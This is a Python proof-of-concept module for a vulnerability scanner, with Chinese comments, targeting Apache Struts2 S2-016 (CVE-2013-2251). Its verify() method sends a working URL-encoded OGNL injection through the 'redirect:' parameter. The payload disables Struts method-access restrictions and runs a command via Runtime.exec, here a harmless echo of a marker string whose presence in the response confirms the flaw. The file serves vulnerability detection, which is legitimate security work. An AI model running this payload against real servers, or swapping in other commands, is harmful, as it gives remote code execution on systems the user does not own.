# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0009_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-016远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-07-09'  # 漏洞公布时间
    desc = '''
        Apache Struts2中存在漏洞，该漏洞在Struts 2之前2.3.15.1信息下面的“action”、“redirect：”或“redirectaction：“没有正确处理过滤。因为该信息将被评估为OGNL表达式和值栈，介绍了服务器端代码注入的可能性。
    '''  # 漏洞描述
    ref = 'https://cwiki.apache.org/confluence/display/WW/S2-016'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2013-2251'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Struts 2.0.0 - Struts 2.3.15 1 '  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ab7671a7-1f6b-461e-8301-00056b434097'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = {'''redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo 92933839f1efb2da9a4799753ee8d79c%27%29.getInputStream%28%29%29%7D''': ''}
            request = requests.get(
                '{target}/index.action'.format(target=self.target), params=payload)
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
